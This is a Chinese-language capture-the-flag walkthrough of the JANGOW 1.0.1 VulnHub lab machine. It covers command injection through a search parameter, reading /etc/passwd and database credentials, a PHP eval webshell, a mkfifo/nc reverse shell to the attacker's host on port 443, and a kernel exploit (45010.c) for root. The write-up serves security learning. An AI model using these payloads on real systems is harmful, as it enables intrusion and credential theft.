# JANGOW 1.0.1

> 靶机文档：[JANGOW 1.0.1](https://www.vulnhub.com/entry/jangow-101,754/)
>
> 下载地址：[**Download (Mirror)**](https://download.vulnhub.com/jangow/jangow-01-1.0.1.ova)
>
> 难易程度：**.**

![image-20230920144550613](./imgs/image-20230920144550613.png)

### 网卡配置

[水果味儿](https://www.cnblogs.com/2022zzt/p/15966351.html)

### 信息收集

#### 主机发现

![image-20230920152630055](./imgs/image-20230920152630055.png)

#### 端口扫描

![image-20230920201852054](./imgs/image-20230920201852054.png)

访问`80`端口

![image-20230920202810203](./imgs/image-20230920202810203.png)

点击`site目录`

![image-20230920203029833](./imgs/image-20230920203029833.png)



点击页面上方的一个选项，发现`Buscar`的页面空白，而且地址栏的`url`看着可以输入一些东西

```
http://192.168.8.16/site/busque.php?buscar=
```



![image-20230920204302463](./imgs/image-20230920204302463.png)

在`?buscar=`后面加上`pwd`，显示了当前路径

`/site/busque.php?buscar=pwd`

![image-20230920204401670](./imgs/image-20230920204401670.png)

`/site/busque.php?buscar=cat%20/etc/passwd`

![image-20230920204425345](./imgs/image-20230920204425345.png)

`/site/busque.php?buscar=ls%20-a` 发现了`wordpress`

![image-20230920204650712](./imgs/image-20230920204650712.png)

查看`wordpress`里都有什么文件  `ls wordpress`
![image-20230920204754415](./imgs/image-20230920204754415.png)

查看`cat%20wordpress/config.php`，页面空白，需要查看页面源代码

![image-20230920204902308](./imgs/image-20230920204902308.png)

发现了数据库配置

```php
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
```

### 漏洞利用

使用命令执行，写入一句话木马

```bash
echo '<?php @eval($_POST[6868]);' >6868.php
```

![image-20230920205153573](./imgs/image-20230920205153573.png)

使用`蚁剑`连接一句话，拿到`webshell`


![image-20230920205655894](./imgs/image-20230920205655894.png)

跟`site`目录同级下，有一个隐藏的`.backup`文件

![image-20230920205923383](./imgs/image-20230920205923383.png)

```php
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
```



![image-20230920205820248](./imgs/image-20230920205820248.png)

拿到webshell权限极低，啥也干不了

#### 反弹Shell

查看攻略，该网站限制了一些端口，只能通过`443`端口进行访问

```
/etc/ufw/applications.d/
```

![image-20230920213735426](./imgs/image-20230920213735426.png)

查看apache2-utils.ufw.profile文件

![image-20230920213857882](./imgs/image-20230920213857882.png)

上传木马

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.8.8 443 >/tmp/f');?>
```

![image-20230920214035452](./imgs/image-20230920214035452.png)

kali监听`443`端口

访问该木马文件

![image-20230920215215714](./imgs/image-20230920215215714.png)

成功反弹到

![image-20230920215227513](./imgs/image-20230920215227513.png)

#### 提权

交换shell

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```

查看内核版本

![image-20230920215412740](./imgs/image-20230920215412740.png)

搜索相关漏洞

```bash
searchsploit ubuntu 4.4.0-31
```



![image-20230920215601443](./imgs/image-20230920215601443.png)

```
searchsploit  -p linux/local/45010.c
```



![image-20230920215621804](./imgs/image-20230920215621804.png)

将`45010.c`上传的靶机

我先发送到我本机，然后本机上传到蚁剑上

![image-20230920215827476](./imgs/image-20230920215827476.png)

![image-20230920215934955](./imgs/image-20230920215934955.png)

赋予可执行权限，然后进行编译

![image-20230920220121864](./imgs/image-20230920220121864.png)

上传一个`a.out`文件，执行它

![image-20230920220221251](./imgs/image-20230920220221251.png)

切到`/root`目录下

![image-20230920220243197](./imgs/image-20230920220243197.png)
